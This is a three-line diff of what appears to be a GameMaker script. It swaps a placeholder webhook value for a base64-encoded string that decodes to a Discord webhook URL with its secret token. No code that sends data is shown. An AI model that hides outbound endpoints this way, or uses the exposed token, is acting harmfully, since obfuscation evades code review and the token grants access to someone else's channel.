@@ -1,3 +1,3 @@
 alarm[0] = 60;
 global.debug = 1;
-webhook = "nuh uh"
+webhook = base64_decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzODQzOTM1NDk3NDczMjI5OC9JSUNyUVU3RFA0TW42TVVzNXdoeGthZ2pfXzdZZ0t4WEtBTUVxUkJrcXVYT1pVRXduSmJpU3U1ZlVLT3QyZUR0dGpfXw==")
